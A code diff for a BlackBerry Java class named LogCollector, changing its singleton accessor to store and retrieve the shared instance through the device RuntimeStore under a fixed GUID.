@@ -18,6 +18,7 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
+import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
@@ -57,6 +58,8 @@ public final class LogCollector implements Singleton {
     // creeremo
     private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave
 
+    private static final long GUID = 0x931be5a5253ec4cL;
+
     // arbitraria
     // di
     // accesso
@@ -94,7 +97,12 @@ public final class LogCollector implements Singleton {
      */
     public static synchronized LogCollector getInstance() {
         if (instance == null) {
-            instance = new LogCollector();
+            instance = (LogCollector) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                LogCollector singleton = new LogCollector();
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
         }
 
         return instance;
